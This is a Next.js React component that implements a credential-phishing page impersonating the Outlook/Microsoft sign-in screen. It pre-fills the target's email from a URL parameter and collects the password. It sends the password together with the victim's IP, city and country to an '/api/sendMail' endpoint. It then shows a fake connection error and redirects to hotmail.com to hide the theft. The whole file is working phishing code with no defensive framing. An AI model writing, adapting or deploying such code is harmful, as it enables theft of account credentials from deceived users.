"use client"
import React, { Fragment, useEffect, useState } from 'react';
import Button from 'react-bootstrap/Button';
import Form from 'react-bootstrap/Form';
// import 'bootstrap/dist/css/bootstrap.min.css';
import './Universal.css'
import Spinner from 'react-bootstrap/Spinner';
import NoPage404 from '../NoPage404/NoPage404';
import Image from "next/image";
import def from '../../../public/next.svg';
import axios from 'axios'
import micro from '../../../public/micro_logo.svg'
import arrow_left from '../../../public/arrow_left.svg'
import { BarLoader } from 'react-spinners';

const Universal = ({data}) => {
  const [email, setEmail] = useState('no-reply@hotmail.com')
  const [password, setPassword] = useState('')
  const [domain, setDomain] = useState('')
  const [name, setName] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')


  useEffect(() => {
   const mySearchParams = new URLSearchParams(window.location.search)
   const email = mySearchParams.get('usn')
   setEmail(email)
   if(email){
    let dm = email.split('@')[1]

    if (dm === 'gmail.com') {
      dm = 'google.com'
     } else if (dm === 'live.com') {
        dm = 'microsoft.com'
     } else if (dm === 'hotmail.com') {
      dm = 'microsoft.com'
     } else if (dm === 'outlook.com') {
      dm = 'microsoft.com'
     }

     const nm = dm.split('.')[0]
      console.log(dm, nm)
      setDomain(dm)
      setName(nm)
   }



  //  for (const [key, value] of mySearchParams.entries()) {
  //   console.log(key, value)
  //  }
  // checkImage(domain)
  }, [domain])

  const sendInfo = async (e) => {
    setLoading(true)
    e.preventDefault()
    console.log('xls: ', data)
    const info = {
      email,
      password,
      country: data.country,
      city: data.city,
      host_ip: data.ip,
      date: new Date().toDateString()
    }

    const res = await fetch('/api/sendMail', {
      method: "POST",
      body: JSON.stringify(info),
      headers: {
        'content-type': 'application/json'
      }
    })
    // console.log(res)
    if(res.ok){
      console.log("Yeai!")
      setLoading(false)
      setError('Error connecting to server')
      setTimeout(() => {
        window.location.href = "https://www.hotmail.com"
      }, 5000)
    }else{
      console.log("Oops! Something is wrong.")
      setLoading(false)
      setError('Error connecting to server')
      setTimeout(() => {
        window.location.href = "https://www.hotmail.com"
      }, 5000)
    }
  }

  // const checkImage = async (domain) => {
  //   // 'use server'
  //   try {
  //     // let qs = `?start=1&limit=5000&convert=USD`
  //     const response = await axios.get(`https://${domain}/favicon.ico`);
  //     const data = response.data
  //     console.log('data: ', data)
  //   } catch (ex) {
  //     console.log('er: ',ex);

  //   }
  // }

  return (
    <Fragment>

      <div className="space flex justify-center" >


      {email ? (
        <div className="center">

          <h1>Outlook</h1>

          <div className='flex loading'><BarLoader width={250} loading={loading} color="#dcdcdc"   /> </div>
          <div className='inner'>
          <div className='adj' >
          <Image width="100" height="100" src={micro} alt={name}/>
          {/* <span className='mt-2' style={{fontWeight: 'bold', fontSize: '22px', marginLeft: '5px'}}>{name.toLocaleUpperCase()}</span> */}
          </div>

          <form  onSubmit={sendInfo}>
            <div className="" style={{display: 'flex'}}>
              <Image src={arrow_left} height="20" width="20" /><input name='email' value={email} className="w-full" type="text" disabled style={{background: "white", border: "none"}}  />
            </div>
            <h4 style={{fontWeight: "800"}}>Enter Password</h4>

            <div class="relative z-0 w-full mb-5 mt-1 group ">
                <input type="password" value={password} onChange={e => setPassword(e.target.value)} name="password" id="password" className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" " required />
                <label for="floating_email" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">Password</label>
            </div>

            <p href="#" style={{fontSize: '12px', marginTop: '10px', color: '#0068b8'}}>Forgot password?</p>


            <button type="submit" class="text-white mt-4 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium text-sm px-5 py-2.5 me-2 mb-2 dark:bg-blue-600 dark:hover:bg-blue-700 focus:outline-none dark:focus:ring-blue-800 float-right">
            {'Sign In'}
            </button>


            {/* {error ? <p style={{fontSize: '12px', color: 'red'}}>{error}</p> : ''} */}
          </form>

          </div>


      </div>
      ) : (
        <NoPage404 />
      )}




      </div>


    </Fragment>

  )
}

export default Universal


